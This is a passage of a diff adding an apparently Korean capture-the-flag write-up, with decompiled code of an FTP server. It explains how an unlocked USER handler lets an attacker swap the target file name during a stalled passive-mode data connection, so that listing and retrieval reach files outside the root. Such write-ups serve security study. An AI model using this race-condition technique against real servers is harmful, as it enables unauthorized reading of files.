+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( v4 )
+</span></span><span style="display:flex;"><span>            v11 <span style="color:#f92672">=</span> v10;
+</span></span><span style="display:flex;"><span>          v19 <span style="color:#f92672">=</span> v11;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          v7 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)instr_recved;
+</span></span><span style="display:flex;"><span>LABEL_41:
+</span></span><span style="display:flex;"><span>          v19 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>          v9 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        v12 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>ftpprocs;
+</span></span><span style="display:flex;"><span>        v13 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> ( <span style="color:#a6e22e">strncasecmp</span>(v7, <span style="color:#f92672">*</span>v12, v9) )     <span style="color:#75715e">// instruction parsing
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        {
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">++</span>v13;
+</span></span><span style="display:flex;"><span>          v12 <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( v13 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x20</span> )                    <span style="color:#75715e">// instruction cnts -&gt; 32
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">writelogentry</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>mutex, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34; @@ CMD: &#34;</span>, (<span style="color:#66d9ef">__int64</span>)instr_recved);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( v40 )
+</span></span><span style="display:flex;"><span>              ((<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">*</span>)(<span style="color:#66d9ef">__int64</span>, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>, <span style="color:#66d9ef">__int64</span>))gnutls_record_send)(
+</span></span><span style="display:flex;"><span>                v40,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;500 Syntax error, command unrecognized.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">41LL</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">send</span>(v26, <span style="color:#e6db74">&#34;500 Syntax error, command unrecognized.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x29uLL</span>, <span style="color:#ae81ff">0x4000</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">goto</span> LABEL_10;
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        v14 <span style="color:#f92672">=</span> ((<span style="color:#66d9ef">__int64</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">*</span>)(<span style="color:#66d9ef">pthread_mutex_t</span> <span style="color:#f92672">*</span>, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>))(<span style="color:#f92672">&amp;</span>ftpprocs)[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v13 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>])(<span style="color:#f92672">&amp;</span>mutex, v19);<span style="color:#75715e">// CALL FTP USR
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> ( v13 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xD</span> )
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">writelogentry</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>mutex, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34; @@ CMD: &#34;</span>, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34;PASS ***&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">writelogentry</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>mutex, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34; @@ CMD: &#34;</span>, (<span style="color:#66d9ef">__int64</span>)instr_recved);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span> ( v14 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> );
+</span></span><span style="display:flex;"><span>      ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>recvcmd_part_0 함수는 \r\n으로 끝나는 명령어가 오면, instruction operand로 잘 분리해서 저장해주고, 함수를 호출한다.</p>
+<pre tabindex="0"><code>.data.rel.ro:000000000000F8E0                                         ; &#34;USER&#34;
+.data.rel.ro:000000000000F8E8                 dq offset ftpUSER
+.data.rel.ro:000000000000F8F0                 dq offset aQuit+1       ; &#34;QUIT&#34;
+.data.rel.ro:000000000000F8F8                 dq offset ftpQUIT
+.data.rel.ro:000000000000F900                 dq offset aNoop         ; &#34;NOOP&#34;
+</code></pre><p>이런식으로 string과 함수 주소가 있어서 이에 맞는 핸들러가 호출된다.</p>
+<p>분석하면서 왜 mutex가 엄청 큰지 궁금했는데, 역시 구조체로 구현되어있었다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _FTPCONTEXT {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pthread_mutex_t</span>     MTLock;
+</span></span><span style="display:flex;"><span>    SOCKET              ControlSocket;
+</span></span><span style="display:flex;"><span>    SOCKET              DataSocket;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pthread_t</span>           WorkerThreadId;
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * WorkerThreadValid is output of pthread_create
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * therefore zero is VALID indicator and -1 is invalid.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>                 WorkerThreadValid;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>                 WorkerThreadAbort;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">in_addr_t</span>           ServerIPv4;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">in_addr_t</span>           ClientIPv4;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">in_addr_t</span>           DataIPv4;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">in_port_t</span>           DataPort;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>                 File;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>                 Mode;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>                 Access;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>                 SessionID;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>                 DataProtectionLevel;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">off_t</span>               RestPoint;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span>            BlockSize;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span>                CurrentDir[PATH_MAX];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span>                RootDir[PATH_MAX];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span>                RnFrom[PATH_MAX];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span>                FileName[<span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>PATH_MAX];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">gnutls_session_t</span>    TLS_session;
+</span></span><span style="display:flex;"><span>    SESSION_STATS       Stats;
+</span></span><span style="display:flex;"><span>} FTPCONTEXT, <span style="color:#f92672">*</span>PFTPCONTEXT;
+</span></span></code></pre></div><p>함수가 호출되면서 FTPCONTEXT가 첫번째 인자로 들어가고 두번째 인자는 명령어의 operand가 들어간다.<br>
+File이나, Access, Mode같은 필드들이 있었다.</p>
+<h3 id="vulnerability">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">ftpUSER</span>(PFTPCONTEXT context, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>params)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( params <span style="color:#f92672">==</span> NULL )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sendstring</span>(context, error501);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    context<span style="color:#f92672">-&gt;</span>Access <span style="color:#f92672">=</span> FTP_ACCESS_NOT_LOGGED_IN;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">writelogentry</span>(context, <span style="color:#e6db74">&#34; USER: &#34;</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)params);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">snprintf</span>(context<span style="color:#f92672">-&gt;</span>FileName, <span style="color:#66d9ef">sizeof</span>(context<span style="color:#f92672">-&gt;</span>FileName), <span style="color:#e6db74">&#34;331 User %s OK. Password required</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, params);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sendstring</span>(context, context<span style="color:#f92672">-&gt;</span>FileName);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Save login name to FileName for the next PASS command */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(context<span style="color:#f92672">-&gt;</span>FileName, params);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>ftpUSER에서 FileName이 덮힌다.<br>
+ftp_effective_path에서</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">snprintf</span>(path, PATH_MAX<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>, <span style="color:#e6db74">&#34;%s/%s&#34;</span>, root_path, normalized_path);
+</span></span></code></pre></div><p>위와 같이 root_path와 normalized_path를 붙이고 ..과 .은 독립적으로 처리가 되기 때문에 Path Traversal은 불가능하다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#a6e22e">ftp_effective_path</span>(context<span style="color:#f92672">-&gt;</span>RootDir, context<span style="color:#f92672">-&gt;</span>CurrentDir, params, <span style="color:#66d9ef">sizeof</span>(context<span style="color:#f92672">-&gt;</span>FileName), context<span style="color:#f92672">-&gt;</span>FileName);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">stat</span>(context<span style="color:#f92672">-&gt;</span>FileName, <span style="color:#f92672">&amp;</span>filestats) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">S_ISDIR</span>(filestats.st_mode) )
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sendstring</span>(context, interm150);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">writelogentry</span>(context, <span style="color:#e6db74">&#34; MLSD-LIST &#34;</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)params);
+</span></span><span style="display:flex;"><span>        context<span style="color:#f92672">-&gt;</span>WorkerThreadAbort <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pthread_mutex_lock</span>(<span style="color:#f92672">&amp;</span>context<span style="color:#f92672">-&gt;</span>MTLock);
+</span></span></code></pre></div><p>ftpMLSD 함수의 일부분을 보면, ftp_effective_path를 호출하고 context-&gt;FileName을 체크하는 것을 알 수 있다.<br>
+이때 root_path가 /server/data라서 거기에 있는 hello.txt를 읽고, mutex가 unlock될때 읽으면 된다고 생각했다.<br>
+그때 mutex를 잘못알고 있어서, 저렇게 생각했었는데, 나중에 알아보니 굳이 mutex unlock 되고 바꿀 필요가 없었다.</p>
+<p>mutex는 기본적으로 쓰레드간 critical section 동시 진입을 막기 위해 존재한다. 그래서 lock을 걸면 mutex에 특정 값을 세팅하고 다른 쓰레드가 critical section에 진입하려하면 lock을 통해 mutex를 보고 막는다.<br>
+만약 다른 쓰레드가 lock을 하지 않고 그냥 돌리게 되면 mutex를 확인도 안하고 그냥 돌리게 된다. 결과적으로 lock 되었는데도 불구하고 다른 쓰레드가 shared variable에 접근할 수 있게된다.</p>
+<h2 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">ftpUSER</span>(PFTPCONTEXT context, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>params)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( params <span style="color:#f92672">==</span> NULL )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sendstring</span>(context, error501);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    context<span style="color:#f92672">-&gt;</span>Access <span style="color:#f92672">=</span> FTP_ACCESS_NOT_LOGGED_IN;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">writelogentry</span>(context, <span style="color:#e6db74">&#34; USER: &#34;</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)params);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">snprintf</span>(context<span style="color:#f92672">-&gt;</span>FileName, <span style="color:#66d9ef">sizeof</span>(context<span style="color:#f92672">-&gt;</span>FileName), <span style="color:#e6db74">&#34;331 User %s OK. Password required</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, params);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sendstring</span>(context, context<span style="color:#f92672">-&gt;</span>FileName);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Save login name to FileName for the next PASS command */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(context<span style="color:#f92672">-&gt;</span>FileName, params);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>ftpUSER 함수에서 mutex lock을 안해서 mutex와 상관없이 context 구조체에 접근할 수 있다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#a6e22e">ftp_effective_path</span>((<span style="color:#66d9ef">__int64</span>)(<span style="color:#f92672">&amp;</span>mutex[<span style="color:#ae81ff">105</span>].__align <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>), (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>mutex[<span style="color:#ae81ff">3</span>], a2, <span style="color:#ae81ff">0x2000uLL</span>, <span style="color:#f92672">&amp;</span>mutex[<span style="color:#ae81ff">310</span>].__size[<span style="color:#ae81ff">8</span>]);
+</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">stat64</span>(<span style="color:#f92672">&amp;</span>mutex[<span style="color:#ae81ff">310</span>].__size[<span style="color:#ae81ff">8</span>], <span style="color:#f92672">&amp;</span>v9);      <span style="color:#75715e">// get stat of file
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  align <span style="color:#f92672">=</span> mutex[<span style="color:#ae81ff">515</span>].__align;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v4 <span style="color:#f92672">&amp;&amp;</span> (v9.st_mode <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xF000</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4000</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( align )
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">gnutls_record_send</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">send</span>(mutex[<span style="color:#ae81ff">1</span>].__lock, <span style="color:#e6db74">&#34;150 File status okay; about to open data connection.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x36uLL</span>, <span style="color:#ae81ff">0x4000</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">writelogentry</span>((<span style="color:#66d9ef">__int64</span>)mutex, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34; MLSD-LIST &#34;</span>, (<span style="color:#66d9ef">__int64</span>)a2);
+</span></span><span style="display:flex;"><span>    mutex[<span style="color:#ae81ff">1</span>].__spins <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_lock</span>(mutex);
+</span></span><span style="display:flex;"><span>    v7 <span style="color:#f92672">=</span> <span style="color:#a6e22e">pthread_create</span>(<span style="color:#f92672">&amp;</span>newthread, <span style="color:#ae81ff">0LL</span>, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>(<span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>))mlsd_thread, mutex);
+</span></span></code></pre></div><p>mlsd_thread를 호출한다.<br>
+그래서 이때 ftpUSER를 호출할 수 있는 상태가 된다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  buf.__pad[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">pthread_mutex_lock</span>(a1);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">__sigsetjmp</span>((<span style="color:#66d9ef">struct</span> __jmp_buf_tag <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">0</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cleanup_handler</span>(a1);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__pthread_unwind_next</span>(<span style="color:#f92672">&amp;</span>buf);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__pthread_register_cancel</span>(<span style="color:#f92672">&amp;</span>buf);
+</span></span></code></pre></div><p>mlsd_thread 함수의 첫부분을 보면 이때 mutex를 거는데, ftpUSER에서 mutex 상관없이 바꿀 수 있어서 사실상 무용지물이 된다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)fd <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">create_datasocket</span>(a1);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)fd <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>a1[<span style="color:#ae81ff">515</span>].__align <span style="color:#f92672">||</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">ftp_init_tls_session</span>(<span style="color:#f92672">&amp;</span>fd[<span style="color:#ae81ff">4</span>], <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)fd, <span style="color:#ae81ff">0</span>) )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      v2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">opendir</span>(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">310</span>].__size[<span style="color:#ae81ff">8</span>]);         <span style="color:#75715e">// open dir
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span> ( v2 )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">readdir64</span>(v2);
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v3 )
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>          v1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mlsd_sub</span>(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">310</span>].__align <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)fd, <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>fd[<span style="color:#ae81ff">4</span>], v3);
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v1 )
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> ( <span style="color:#f92672">!</span>a1[<span style="color:#ae81ff">1</span>].__spins );
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">closedir</span>(v2);
+</span></span><span style="display:flex;"><span>      }
+</span></span></code></pre></div><p>mutex 걸고 create_datasocket을 호출해서 fd를 받아오는데, PASSIVE MODE 걸어주고 돌리면, 포트에 접속할때까지 create_datasocket에서 멈춘다.<br>
+그래서 멈췄을때 바로 FileName을 바꿔주면 안정적으로 race condition을 트리거할 수 있다.</p>
+<p>fd로 결과를 보내준다.<br>
+이걸로 flag의 이름을 알 수 있다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">create_datasocket</span>(a1);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( fd <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">20600</span>) )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">ftp_init_tls_session</span>(<span style="color:#f92672">&amp;</span>v15, fd, <span style="color:#ae81ff">0</span>) )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_6;
+</span></span><span style="display:flex;"><span>      max_size <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">gnutls_record_get_max_size</span>(v15);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( max_size <span style="color:#f92672">&gt;</span> <span style="color:#f92672">&amp;</span>_data_start )
+</span></span><span style="display:flex;"><span>        max_size <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>_data_start;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      max_size <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>_data_start;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">open64</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">12408</span>), <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">80</span>) <span style="color:#f92672">=</span> v4;
+</span></span><span style="display:flex;"><span>    v5 <span style="color:#f92672">=</span> v4;
+</span></span></code></pre></div><p>이거랑 같은 맥락으로 retr_thread도 FileName을 바꿔주면 된다.<br>
+당연히 앞에 ftpUSER 함수에서 user name을 바꿨으니 다시 로그인?을 해줘야한다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>SOCKET <span style="color:#a6e22e">create_datasocket</span>(PFTPCONTEXT context)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> ( context<span style="color:#f92672">-&gt;</span>Mode ) {
+</span></span><span style="display:flex;"><span>	...
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> MODE_PASSIVE:
+</span></span><span style="display:flex;"><span>        asz <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(laddr);
+</span></span><span style="display:flex;"><span>        clientsocket <span style="color:#f92672">=</span> <span style="color:#a6e22e">accept</span>(context<span style="color:#f92672">-&gt;</span>DataSocket, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>laddr, <span style="color:#f92672">&amp;</span>asz);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(context<span style="color:#f92672">-&gt;</span>DataSocket);
